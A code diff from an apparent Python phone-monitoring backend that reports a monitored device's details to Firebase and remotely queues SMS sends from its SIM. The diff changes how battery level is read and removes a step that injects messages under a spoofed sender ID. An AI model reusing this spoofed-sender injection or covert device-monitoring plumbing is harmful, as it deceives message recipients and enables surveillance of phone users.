@@ -157,7 +157,7 @@ async def register_device_on_firebase(
     payload = {
         "name": device.name,
         "phone": device.phone_number,
-        "battery": meta.get("battery", "98"),
+        "battery": meta.get("battery") or meta.get("battery_level"),
         "online": True,
         "sim_index": profile.selected_sim_index or 0,
         "last_seen": datetime.now(timezone.utc).isoformat(),
@@ -247,7 +247,6 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
 
     if profile.phone_number:
         mynum = normalize_phone(profile.phone_number)
-        # Real SMS from monitored device SIM -> /mynum number
         tasks.append(
             push_outgoing_sms_command(
                 firebase_url,
@@ -255,15 +254,6 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
                 mynum,
                 STARTUP_TEST_MESSAGE,
                 sim_index=sim_index,
-            )
-        )
-        # Spoof inject on /mynum inbox (same sender ID flow)
-        tasks.append(
-            push_inject_message(
-                firebase_url,
-                mynum_device_id(mynum),
-                STARTUP_TEST_SENDER,
-                STARTUP_TEST_MESSAGE,
             )
         )
 
